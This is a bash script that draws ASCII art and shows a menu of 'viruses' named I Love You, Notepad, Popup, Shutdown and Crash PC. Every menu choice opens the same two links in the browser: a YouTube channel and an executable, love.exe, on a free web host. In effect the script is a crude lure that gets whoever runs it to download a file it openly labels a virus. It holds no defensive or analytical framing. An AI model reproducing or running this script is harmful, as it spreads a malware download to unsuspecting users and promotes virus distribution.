#!/bin/bash

while true; do
    clear
     # Function to display ASCII art
display_art() {
    echo "
                        ___......__             _
                        _.-'           ~-_       _.=a~~-_
--=====-.-.-_----------~   .--.       _   -.__.-~ ( ___===>
              '''--...__  (    \ \\\ { )       _.-~
                        =_ ~_  \\-~~~//~~~~-=-~
                         |-=-~_ \\   \\
                         |_/   =. )   ~}
                         |}      ||
                        //       ||
                      _//        {{
                   '='~'          \\_    =
                                   ~~'                                                  
"
}

# Display the ASCII art
display_art
    echo "Menu:"
    echo "1. I Love You Virus"
    echo "2. Notepad Virus"
    echo "3. Popup Virus"
 echo "4. Shutdown Virus"
 echo "5. Crash PC Virus"
    echo "6. Exit"
    read -p "Select an option: " choice

link0="https://www.youtube.com/techhacker7"
link1="https://wdevmail.000webhostapp.com/Bach%20File/love.exe"

    case $choice in
        1)
            echo "You selected:  I Love You Virus"
            # Add code to run the other bash script here
           
            xdg-open "$link1" &
            xdg-open "$link0" &
  # Open link in default browser
            ;;
        2)
            echo "You selected: Notepad Virus"
            # Add code to run the other bash script here
            xdg-open "$link0" &
            xdg-open "$link1" &
  # Open link in default browser
            ;;
        3)
            echo "You selected: Popup Virus"
            # Add code to run the other bash script here
            xdg-open "$link0" &
            xdg-open "$link1" &
  # Open link in default browser
            ;;
	    4)
            echo "You selected: Shutdown Virus"
            # Add code to run the other bash script here
            xdg-open "$link0" &
            xdg-open "$link1" &
  # Open link in default browser
            ;;
		5)
            echo "You selected: Crash PC Virus"
            # Add code to run the other bash script here
            xdg-open "$link0" &
            xdg-open "$link1" &
  # Open link in default browser
            ;;
        6)
            echo "Exiting..."
            exit
            ;;
        *)
            echo "Invalid choice. Please select a valid option."
            ;;
    esac

    # Wait for user input before clearing the screen and showing the menu again
    read -p "Press Enter to continue..."
done

